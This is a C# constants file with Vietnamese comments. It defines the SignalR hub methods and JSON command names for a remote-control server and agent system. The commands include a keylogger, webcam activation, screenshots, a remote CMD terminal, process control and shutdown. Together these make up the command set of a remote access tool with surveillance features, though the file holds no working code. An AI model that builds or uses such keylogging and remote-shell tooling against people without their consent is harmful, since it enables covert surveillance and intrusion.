// -----------------------------------------------------------------------------
// File: ProtocolConstants.cs
// Description:
//      Định nghĩa toàn bộ constant dùng trong giao thức giao tiếp giữa
//      Server <-> Agent <-> Client (SignalR + JSON actions).
//
//      Mục đích: Tránh trùng tên, gõ sai string, và giữ tính nhất quán
//      của toàn bộ hệ thống.
//
// -----------------------------------------------------------------------------

namespace RCS.Common.Protocols
{
    public static class ProtocolConstants
    {
        // Hub Methods (Tên hàm mà Client/Server invoke)
        public const string RegisterAgent = "RegisterAgent";    // Client gọi để đăng ký với Server
        public const string ReceiveCommand = "ReceiveCommand";  // Agent gọi để nhận lệnh từ Server
        public const string SendResponse = "SendResponse";   // Agent gọi để gửi phản hồi về Server
        public const string SendUpdate = "SendUpdate";  // Agent gọi để gửi cập nhật realtime (vd: keylogger)
        public const string SendBinaryStream = "SendBinaryStream";  // Agent gọi để gửi dữ liệu nhị phân

        // Command Actions (Tên lệnh trong JSON)
        public const string ActionAppList = "app_list";     // Lấy danh sách ứng dụng đã cài đặt
        public const string ActionAppStart = "app_start";   // Khởi động ứng dụng
        public const string ActionAppStop = "app_stop";    // Dừng ứng dụng
        
        public const string ActionProcessList = "process_list";  // Lấy danh sách process đang chạy
        public const string ActionProcessStart = "process_start";   // Khởi động process
        public const string ActionProcessStop = "process_stop";   // Dừng process
        public const string ActionGetSystemSpecs = "sys_specs";   // Lấy thông số kỹ thuật

        public const string ActionScreenshot = "screenshot";    // Chụp ảnh
        
        public const string ActionKeyloggerStart = "keylogger_start";   // Bắt đầu ghi keylogger
        public const string ActionKeyloggerStop = "keylogger_stop";    // Dừng ghi keylogger
        
        public const string ActionWebcamOn = "webcam_on";   // Bật webcam
        public const string ActionWebcamOff = "webcam_off";     // Tắt webcam

        public const string ActionShutdown = "shutdown";    // Tắt máy
        public const string ActionRestart = "restart";   // Khởi động lại máy

        // --- TERMINAL COMMANDS ---
        public const string ActionTerminalStart = "term_start"; // Bắt đầu phiên CMD
        public const string ActionTerminalStop = "term_stop";   // Hủy phiên CMD
        public const string ActionTerminalInput = "term_input"; // Gửi lệnh (vd: "dir")
        
        // --- TERMINAL EVENTS (Gửi về Client) ---
        public const string EventTerminalOutput = "term_output"; // Kết quả trả về

        // --- NHÓM TƯƠNG TÁC & TỰ ĐỘNG HÓA ---
        public const string ActionShowMessageBox = "interact_msgbox"; // Hiện thông báo
        public const string ActionTextToSpeech = "interact_tts";      // Phát âm thanh
        public const string ActionRunMacro = "interact_macro";        // Chạy kịch bản
    }
}